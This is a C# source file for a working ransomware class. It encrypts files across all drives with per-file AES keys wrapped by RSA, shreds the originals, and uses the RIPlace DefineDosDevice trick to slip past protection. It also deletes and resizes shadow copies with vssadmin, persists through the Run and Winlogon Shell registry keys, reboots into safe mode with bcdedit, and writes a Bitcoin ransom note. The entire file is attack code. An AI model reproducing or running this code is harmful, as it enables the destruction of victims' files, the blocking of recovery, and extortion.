using Shared;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;

namespace Ransom
{
    class Ransomware
    {
        #region Parameters
        protected static Action<string>? OnFileFound;
        protected static Action? OnEncryptionStart;
        protected static Action? OnEncryptionEnd;
        
        private const uint DDD_RAW_TARGET_PATH = 0x1;
        private const uint DDD_REMOVE_DEFINITION = 0x2;
        private const uint MOVEFILE_REPLACE_EXISTING = 0x1;
        private const uint MOVEFILE_WRITE_THROUGH = 0x8;

        private static readonly Dictionary<EncryptedAES, string> encryptedAesKeysPaths = new();
        private static readonly List<string> allFiles = new();
        private readonly List<string> IGNORE_PATHS = new() { "tmp", "winnt", "application data", "appdata", "temp", "thumb", "$recycle.bin", "system volume information", "program files", "program files (x86)", "windows", "boot", "bios" };     //What folders should we ignore
        private readonly List<string> IGNORE_EXTENSIONS = new() { ".exe", ".dll", ".lnk", ".sys", ".msi", ".bat", Settings.RANSOMWARE_EXTENSION };        //What files should we ignore
        private readonly string[] drives;
        private readonly string[] RUN_REGISTER = new string[] { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "GatewayFQDN" };        //Run register path and name
        private readonly string[] SAFE_MODE_REGISTER = new string[] { @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "explorer.exe" };   //Safe mode register path and name

        private static Aes? currentAes;
        private static RSAParameters publicKey;
        private static string dosName = "r1pp3d";
        private static string dosPath = Path.Combine(Path.GetTempPath(), dosName);
        #endregion

        public Ransomware()
        {
            drives = Environment.GetLogicalDrives();
            
            OnFileFound += EncryptFile;
            OnEncryptionStart = GenerateKeysAndSaveThem;
            OnEncryptionEnd = WriteEncryptedDataToFile;
        }
        
        public void EncryptSystem()
        {
            OnEncryptionStart?.Invoke();
            IterateSystem();
            OnEncryptionEnd?.Invoke();
        }
        
        public void BecomePersistent()
        {
            Utility.ModifyRegister(1, RUN_REGISTER[0], RUN_REGISTER[1], Settings.CURRENT_PATH);
            Utility.ModifyRegister(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], Settings.CURRENT_PATH);
        }

        public void RestoreRegistryKeys()
        {
            Utility.DeleteRegister(1, RUN_REGISTER[0], RUN_REGISTER[1]);
            Utility.ModifyRegister(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], SAFE_MODE_REGISTER[2]);
        }

        public bool AlreadyExecuted()
        {
            return Utility.DoesRegExists(1, RUN_REGISTER[0], RUN_REGISTER[1]) ||
                Utility.DoesRegExists(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], Settings.CURRENT_PATH);
        }

        public void DeleteShadowCopies()
        {
            string first_command = "vssadmin Delete Shadows /all /quiet";
            string[] resize_commands = { "vssadmin resize shadowstorage /for={0}: /on={1}: /maxsize=401MB", "vssadmin resize shadowstorage /for={0}: /on={1}: /maxsize=unbounded" };

            Utility.RunCMDCommand(first_command);
            foreach (string drive in drives)
            {
                char dir_letter = drive[0];

                Utility.RunCMDCommand(string.Format(resize_commands[0], dir_letter, dir_letter));
                Utility.RunCMDCommand(string.Format(resize_commands[1], dir_letter, dir_letter));
            }

            Utility.RunCMDCommand(first_command);
        }

        public static void ChangeBootState(bool rebootIntoSafeMode)
        {
            if (rebootIntoSafeMode)
            {
                Utility.RunCMDCommand(@"bcdedit /set {default} safeboot network");     //Enter safe mode on restart
                Utility.RunCMDCommand(@"bcdedit /set {current} bootstatuspolicy ignoreallfailures");
            }
            else
                Utility.RunCMDCommand(@"bcdedit /deletevalue {default} safeboot");     //Exit safe mode on restart

            Utility.RunCMDCommand("shutdown /r /t 0");
        }

        public static void CreateNote(bool openInNotepad)
        {
            try
            {
                string email = Settings.EMAIL;
                string file1 = Settings.AES_KEYS_PATH;
                string file2 = Settings.ENCRYPTED_PRIVATE_KEY;
                string path = Settings.NOTE_PATH;
                
                using (StreamWriter sw = new(path))
                {
                    sw.Write(string.Format(Settings.DESKTOP_NOTE, Settings.USD_AMOUNT, Settings.BTC_ADDRESS, email, file1, file2));
                }

                if (openInNotepad)
                    Process.Start("notepad.exe", path);     //Open the file in notepad
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static Aes? EncryptAndWrite(string source, string dest)
        {
            string? data;
            try
            {
                data = File.ReadAllText(source, Encoding.UTF8);
                if (string.IsNullOrEmpty(data) || string.IsNullOrWhiteSpace(data))
                    return null;

                Aes aes = Symmetric.GenerateKey();
                byte[] encryptedData = Symmetric.String2AES(data, aes.Key, aes.IV);

                using (var fs = new FileStream(dest, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    fs.Write(encryptedData, 0, encryptedData.Length);
                }

                return aes;
            }
            catch (Exception) { return null; }
        }

        private static bool RIPlaceFile(string pathToRIPlace)
        {
            if (!IsFilePathValid(pathToRIPlace))
                return false;

            Cleanup();
            if (!PrepareRIPlace(pathToRIPlace, out string encryptedFilePath))
            {
                Cleanup(encryptedFilePath);
                return false;
            }
            if (currentAes == null)
                return false;

            dosName = Path.GetFileName(pathToRIPlace);
            string? path = Path.GetDirectoryName(pathToRIPlace);
            if (string.IsNullOrEmpty(dosName) || string.IsNullOrEmpty(path))
                return false;

            dosPath = Path.Combine(path, dosName + Settings.RANSOMWARE_EXTENSION);
            if (!RIPlace(encryptedFilePath, pathToRIPlace))
            {
                Cleanup(encryptedFilePath);
                return false;
            }

            Cleanup();
            Cleanup(pathToRIPlace);

            Console.WriteLine($"RIPlaced: {encryptedFilePath}");
            return true;
        }

        private static bool PrepareRIPlace(string targetPath, out string encryptedPath)
        {
            encryptedPath = string.Empty;
            try
            {
                string currentDir = string.Empty;
                try
                {
                    currentDir = Path.GetTempPath();
                }
                catch (Exception) { return false; }

                encryptedPath = Utility.GetRandomPath(currentDir);
                currentAes = EncryptAndWrite(targetPath, encryptedPath);

                return currentAes != null;
            }
            catch (Exception) { return false; }
        }

        private static bool RIPlace(string encryptedPath, string originalPath)
        {
            if (!NativeMethods.DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosName, @"\??\" + originalPath))
                return false;
            if (!NativeMethods.MoveFileExW(encryptedPath, dosPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
                return false;

            return true;
        }
        
        private static bool IsFilePathValid(string? filePath)
        {
            if (string.IsNullOrEmpty(filePath) || string.IsNullOrWhiteSpace(filePath))
                return false;
            if (!File.Exists(filePath))
                return false;

            return true;
        }

        private static void Cleanup(string? fileToDelete = null)
        {
            NativeMethods.DefineDosDeviceW(DDD_REMOVE_DEFINITION | DDD_RAW_TARGET_PATH, dosName, string.Empty);
            if (!IsFilePathValid(fileToDelete))
                return;

            try
            {
                Utility.ShredFile(fileToDelete);
            }
            catch { }
        }
        
        private static void EncryptAesKey(Aes? key, string value)
        {
            if (key == null || string.IsNullOrEmpty(value))
                return;

            //Encrypt AES keys using RSA
            byte[]? encryptedAesKey = Asymmetric.String2RSA(Encoding.UTF8.GetString(key.Key), publicKey);
            byte[]? encryptedAesIV = Asymmetric.String2RSA(Encoding.UTF8.GetString(key.IV), publicKey);
            if (encryptedAesKey == null || encryptedAesIV == null)
                return;

            //Convert Encrypted keys using Base64
            string? encodedKey = Convert.ToBase64String(encryptedAesKey);
            string? encodedIV = Convert.ToBase64String(encryptedAesIV);
            if (encodedKey == null || encodedIV == null)
                return;

            //Create new Aes with the encrypted Key and IV
            EncryptedAES? encryptedAes = new(encodedKey, encodedIV);
            if (encryptedAes != null)
                encryptedAesKeysPaths.Add(encryptedAes, value);
        }

        private static void GenerateKeysAndSaveThem()
        {
            Asymmetric? asymmetric = new();
            (publicKey, RSAParameters privateKey) = asymmetric.GenerateKeys();
            List<byte[]> encryptedPrivateKey = Asymmetric.RSAKey2RSA(privateKey, Settings.SERVER_PUBLIC_KEY);
            
            privateKey = new RSAParameters();
            asymmetric = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();

            using FileStream fs = File.Open(Settings.ENCRYPTED_PRIVATE_KEY, FileMode.OpenOrCreate);
            using StreamWriter sw = new(fs);

            foreach (byte[] enc in encryptedPrivateKey)
            {
                try
                {
                    string encodedData = Convert.ToBase64String(enc);
                    if (string.IsNullOrEmpty(encodedData))
                        break;

                    sw.WriteLine(encodedData);
                }
                catch (Exception) { break; }
            }
        }

        private static void WriteEncryptedDataToFile()
        {
            if (encryptedAesKeysPaths != null)
            {
                List<EncryptedAES> keys = encryptedAesKeysPaths.Keys.ToList();
                List<string> stringKeys = new();
                List<string> stringIVs = new();

                foreach (EncryptedAES encAES in keys)
                {
                    string? key = encAES.Key;
                    string? iv = encAES.IV;
                    if (!string.IsNullOrEmpty(key) && !string.IsNullOrEmpty(iv))
                    {
                        stringKeys.Add(key);
                        stringIVs.Add(iv);
                    }
                }

                Utility.WriteDictToFile(Settings.AES_KEYS_PATH, stringKeys, stringIVs, encryptedAesKeysPaths.Values.ToArray());
            }
        }

        private void IterateSystem()
        {
            List<Thread> threads = new();
            foreach (string drive in drives)
            {
                DriveInfo driveInfo = new(drive);
                if (driveInfo.IsReady)
                {
                    DirectoryInfo rootDirectory = driveInfo.RootDirectory;
                    Thread thread = new((dir) =>
                    {
                        WalkDirectory((DirectoryInfo)dir);
                    })
                    { IsBackground = true };

                    threads.Add(thread);
                    thread.Start(rootDirectory);
                }
            }

            threads.ForEach(thread => thread.Join());
        }

        private void WalkDirectory(DirectoryInfo? dir)
        {
            FileInfo[]? files = null;
            if (dir == null)
                return;

            try
            {
                files = dir.GetFiles("*.*");
            }
            catch (Exception) { }

            if (files != null)
            {
                foreach (FileInfo file in files)
                {
                    string extension = Path.GetExtension(file.FullName);
                    if (extension != null && !IGNORE_EXTENSIONS.Contains(extension.ToLower()))
                    {
                        string path = file.FullName;
                        
                        OnFileFound?.Invoke(path);
                        allFiles.Add(path);
                    }
                }

                DirectoryInfo[] subDirs = dir.GetDirectories();
                foreach (DirectoryInfo dirInfo in subDirs)
                {
                    if (!IGNORE_PATHS.Contains(dirInfo.Name.ToLower()))
                        WalkDirectory(dirInfo);
                }
            }
        }

        private void EncryptFile(string? path)
        {
            if (string.IsNullOrEmpty(path))
                return;

            Aes? aes = null;
            bool result = RIPlaceFile(path);
            string modifiedPath = string.Empty;

            if (!result)
            {
                Console.WriteLine($"Encrypting {path} regulary");
                modifiedPath = path + Settings.RANSOMWARE_EXTENSION;

                aes = EncryptAndWrite(path, modifiedPath);
                if (aes == null)
                {
                    Console.WriteLine($"Failed to RIPlace or regularly encrypt: {path}");
                    return;
                }

            }

            if (aes == null)    //RIPlace worked
                EncryptAesKey(currentAes, dosPath);
            else
                EncryptAesKey(aes, modifiedPath);

            Utility.ShredFile(path);
        }
    }
}
